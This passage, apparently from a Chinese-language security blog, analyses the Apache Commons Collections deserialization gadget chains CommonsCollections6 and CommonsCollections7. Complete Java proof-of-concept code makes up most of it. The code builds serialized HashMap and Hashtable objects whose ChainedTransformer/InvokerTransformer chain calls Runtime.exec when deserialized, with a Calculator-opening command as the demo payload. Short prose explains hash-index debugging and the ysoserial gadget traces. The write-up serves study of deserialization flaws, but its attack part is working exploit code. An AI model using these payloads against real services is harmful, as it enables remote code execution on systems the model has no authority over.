class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections6</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">CommonsCollections6</span> <span class="variable">transformerTest</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CommonsCollections6</span>();</span><br><span class="line">        transformerTest.serialize();</span><br><span class="line">        transformerTest.unserialize();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 客户端</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span>  <span class="title function_">serialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;open -a Calculator.app&quot;</span>;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="comment">// new Class[0]为占位符</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;cmd&#125;</span><br><span class="line">                )</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">// 创建恶意的调用链</span></span><br><span class="line">        Transformer[] fakeTransformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(fakeTransformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, chainedTransformer);</span><br><span class="line">        <span class="comment">// 创建TiedMapEntry实例</span></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(outerMap,<span class="string">&quot;keyTest&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">expMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        expMap.put(<span class="string">&quot;aaa&quot;</span>,<span class="string">&quot;valueTest&quot;</span>);</span><br><span class="line">        <span class="comment">// 通过反射获取table</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">table</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.util.HashMap&quot;</span>).getDeclaredField(<span class="string">&quot;table&quot;</span>);</span><br><span class="line">        table.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Object[] array = (Object[]) table.get(expMap);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">node</span> <span class="operator">=</span> array[<span class="number">0</span>];</span><br><span class="line">        <span class="type">Field</span> <span class="variable">expMapKey</span> <span class="operator">=</span> node.getClass().getDeclaredField(<span class="string">&quot;key&quot;</span>);</span><br><span class="line">        expMapKey.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        expMapKey.set(node, tiedMapEntry);</span><br><span class="line">        <span class="comment">// 将真正的利用链数组设置到ChainedTransformer里面的iTransformers字段值</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(chainedTransformer, transformers);</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="comment">// 创建并实例化对象输出流</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        out.writeObject(expMap);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 服务端</span></span><br><span class="line"><span class="comment">     *  */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// 创建并实例化文件输入流</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="comment">// 创建并实例化对象输入流</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">        in.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></p><p><strong>坑点！！！</strong></p><p>如果有同学将 key 取值成<code>keyTest</code>，而不是<code>aaa</code>时，会发现报错为空<br><img src="images/image-20221008174729245.png" alt="image-20221008174729245"></p><p>调试了一下，发现如果<code>key</code>为<code>keyTest</code>字符串时，变成了<code>array[4]</code>才能取到我们前面设置的值。<br><img src="images/image-20221008174748438.png" alt="image-20221008174748438"></p><p>这是为什么呢？继续怀着好奇心调试，发现问题还是在 put 上，可以看到这里对<code>key</code>传进了<code>hash()</code>方法中进行运算<br><img src="images/image-20221008174930212.png" alt="image-20221008174930212"></p><p><img src="images/image-20221008180314692.png" alt="image-20221008180314692"></p><p>因此 key 为<code>aaa</code>和<code>keyTest</code>的值完全不同，导致了最后 i 分别为 0 和 4<br><img src="images/image-20221008175056295.png" alt="image-20221008175056295"></p><p><img src="images/image-20221008175106525.png" alt="image-20221008175106525"></p><p>因此修改最终 POC为：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.serialize;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/10/4 21:55</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections6</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">CommonsCollections6</span> <span class="variable">transformerTest</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CommonsCollections6</span>();</span><br><span class="line">        transformerTest.serialize();</span><br><span class="line">        transformerTest.unserialize();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 客户端</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span>  <span class="title function_">serialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;open -a Calculator.app&quot;</span>;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="comment">// new Class[0]为占位符</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;cmd&#125;</span><br><span class="line">                )</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">// 创建恶意的调用链</span></span><br><span class="line">        Transformer[] fakeTransformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(fakeTransformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, chainedTransformer);</span><br><span class="line">        <span class="comment">// 创建TiedMapEntry实例</span></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(outerMap,<span class="string">&quot;keyTest&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">expMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">String</span> <span class="variable">key</span> <span class="operator">=</span> <span class="string">&quot;keyTest&quot;</span>;</span><br><span class="line">        expMap.put(key ,<span class="string">&quot;valueTest&quot;</span>);</span><br><span class="line">        <span class="comment">// 通过反射获取table</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">table</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.util.HashMap&quot;</span>).getDeclaredField(<span class="string">&quot;table&quot;</span>);</span><br><span class="line">        table.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Object[] array = (Object[]) table.get(expMap);</span><br><span class="line">        <span class="type">int</span> h;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">node</span> <span class="operator">=</span> array[((h=key.hashCode()) ^ (h &gt;&gt;&gt; <span class="number">16</span>)) &amp; (array.length -<span class="number">1</span>)];</span><br><span class="line">        <span class="type">Field</span> <span class="variable">expMapKey</span> <span class="operator">=</span> node.getClass().getDeclaredField(<span class="string">&quot;key&quot;</span>);</span><br><span class="line">        expMapKey.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        expMapKey.set(node, tiedMapEntry);</span><br><span class="line">        <span class="comment">// 将真正的利用链数组设置到ChainedTransformer里面的iTransformers字段值</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(chainedTransformer, transformers);</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="comment">// 创建并实例化对象输出流</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        out.writeObject(expMap);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 服务端</span></span><br><span class="line"><span class="comment">     *  */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// 创建并实例化文件输入流</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="comment">// 创建并实例化对象输入流</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">        in.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></p><p><img src="images/image-20221008180530399.png" alt="image-20221008180530399"></p><h2 id="ysoserial的做法"><a href="#ysoserial的做法" class="headerlink" title="ysoserial的做法"></a>ysoserial的做法</h2><p>接着看看<code>ysoserial</code>的实现，给出的利用链为：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Gadget chain:</span></span><br><span class="line"><span class="comment">    java.io.ObjectInputStream.readObject()</span></span><br><span class="line"><span class="comment">            java.util.HashSet.readObject()</span></span><br><span class="line"><span class="comment">                java.util.HashMap.put()</span></span><br><span class="line"><span class="comment">                java.util.HashMap.hash()</span></span><br><span class="line"><span class="comment">                    org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()</span></span><br><span class="line"><span class="comment">                    org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()</span></span><br><span class="line"><span class="comment">                        org.apache.commons.collections.map.LazyMap.get()</span></span><br><span class="line"><span class="comment">                            org.apache.commons.collections.functors.ChainedTransformer.transform()</span></span><br><span class="line"><span class="comment">                            org.apache.commons.collections.functors.InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">                            java.lang.reflect.Method.invoke()</span></span><br><span class="line"><span class="comment">                                java.lang.Runtime.exec()</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    by @matthias_kaiser</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></p><p>对比前面的，可以发现<code>ysoserial</code>采用的是<code>HashSet</code>，在<code>HashSet#readObject()</code>方法中最后会调用到<code>HashMap#put()</code><br><img src="images/image-20221009103459255.png" alt="image-20221009103459255"></p><p>而通过前面的分析，我们知道<code>HashMap#put()</code>最终也会调用到<code>hashCode()</code>方法，这里就不赘述了。</p>]]></content>
    
    
    <summary type="html">CommonsCollections6利用链分析</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>CommonsCollections7利用链分析</title>
    <link href="http://example.com/2022/11/10/CommonsCollections7/"/>
    <id>http://example.com/2022/11/10/CommonsCollections7/</id>
    <published>2022-11-09T16:18:15.000Z</published>
    <updated>2022-11-21T11:55:12.300Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CommonsCollections7利用链分析"><a href="#CommonsCollections7利用链分析" class="headerlink" title="CommonsCollections7利用链分析"></a>CommonsCollections7利用链分析</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>终于迎来最后一条链子<code>CommonsCollections7</code>，利用条件如下：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CommonsCollections 3.1 - 3.2.1</span><br><span class="line">JDK版本未知限制</span><br></pre></td></tr></table></figure></p><p>先看<code>ysoserial</code>给出的利用链<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Payload method chain:</span><br><span class="line"></span><br><span class="line">    java.util.Hashtable.readObject</span><br><span class="line">    java.util.Hashtable.reconstitutionPut</span><br><span class="line">    org.apache.commons.collections.map.AbstractMapDecorator.equals</span><br><span class="line">    java.util.AbstractMap.equals</span><br><span class="line">    org.apache.commons.collections.map.LazyMap.get</span><br><span class="line">    org.apache.commons.collections.functors.ChainedTransformer.transform</span><br><span class="line">    org.apache.commons.collections.functors.InvokerTransformer.transform</span><br><span class="line">    java.lang.reflect.Method.invoke</span><br><span class="line">    sun.reflect.DelegatingMethodAccessorImpl.invoke</span><br><span class="line">    sun.reflect.NativeMethodAccessorImpl.invoke</span><br><span class="line">    sun.reflect.NativeMethodAccessorImpl.invoke0</span><br><span class="line">    java.lang.Runtime.exec</span><br></pre></td></tr></table></figure></p><p>可以看到从<code>LazyMap#get()</code>起后面的都是<code>CommonsCollections1</code>的内容，前面则是新知识点，也是一条寻找了其他能触发<code>LazyMap#get()</code>方法的链子</p><h2 id="利用链分析"><a href="#利用链分析" class="headerlink" title="利用链分析"></a>利用链分析</h2><p>根据 gadget 先跟进<code>Hashtable#readObject()</code>方法源码<br><img src="images/image-20221011152526177.png" alt="image-20221011152526177"></p><p>其中<code>s</code>是我们传入的输入流，分别通过<code>readObject()</code>进行反序列化赋值给<code>key</code>以及<code>value</code>，接着调用<code>reconstitutionPut()</code>方法，继续跟进<br><img src="images/image-20221011152715640.png" alt="image-20221011152715640"></p><p>在<code>reconstitutionPut()</code>方法中，调用了<code>key.equals()</code>方法，这里我们知道<code>key</code>是可控的，根据调用链看，最终是调用了<code>AbstractMap#equals()</code>，我们继续跟进<code>AbstractMap</code>类的<code>equals()</code>方法<br><img src="images/image-20221011153118215.png" alt="image-20221011153118215"></p><p>可以看见最终调用了<code>m.get()</code>方法，也就是如果<code>m</code>可控，则可以完成调用<code>LazyMap#get()</code>方法触发命令执行。在这里，<code>m</code>由传进来的参数<code>o</code>控制，也就是最初的<code>key</code>。</p><p>我们回到原来的<code>Hashtable</code>类，既然在<code>readObject()</code>方法对输入流进行反序列化，那么我们就去看序列化的方法<code>writeObject()</code><br><img src="images/image-20221011153622433.png" alt="image-20221011153622433"></p><p>这里的<code>entryStack.key</code>和<code>entryStack.value</code>则是我们通过<code>put()</code>传入的<code>key</code>和<code>value</code>。因此我们如果<code>put()</code>方法中的<code>key</code>为<code>LazyMap</code>对象的话，最终<code>m</code>则是<code>LazyMap</code>对象。</p><p>这里还剩下一个问题，就是怎么调用到<code>AbstractMap#equals()</code>方法呢？</p><p>首先我们必须构造<code>key</code>为<code>LazyMap</code>对象，最后才能调用到<code>LazyMap#get()</code>。因此我们再回来看看<code>LazyMap</code>类<br><img src="images/image-20221011162909030.png" alt="image-20221011162909030"></p><p>搜索一遍并没有发现<code>LazyMap</code>类有<code>equals()</code>方法，但最后注意到<code>LazyMap</code>类继承于<code>AbstractMapDecorator</code>类，跟进<br><img src="images/image-20221011163120529.png" alt="image-20221011163120529"></p><p><code>AbstractMapDecorator</code>类含有<code>equals()</code>方法。根据前面的学习，我们会构造以下 payload</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">innerMap1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"><span class="type">Map</span> <span class="variable">lazyMap1</span> <span class="operator">=</span> LazyMap.decorate(innerMap1,chainedTransformer);</span><br></pre></td></tr></table></figure><p>所以此时的<code>this.map</code>为<code>HashMap</code>类对象，因此接下来会进入<code>HashMap#equals()</code><br><img src="images/image-20221011163412678.png" alt="image-20221011163412678"></p><p>而<code>HashMap</code>又继承于<code>AbstractMap</code>类，因此最终会调用到<code>AbstractMap#equals()</code>方法，整条利用链就通了，妙哉。</p><p>最终 POC 为<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.serialize;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/10/4 21:55</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections7</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">CommonsCollections7</span> <span class="variable">commonsCollections7</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CommonsCollections7</span>();</span><br><span class="line">        commonsCollections7.serialize();</span><br><span class="line">        commonsCollections7.unserialize();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 客户端</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span>  <span class="title function_">serialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;open -a Calculator.app&quot;</span>;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="comment">// new 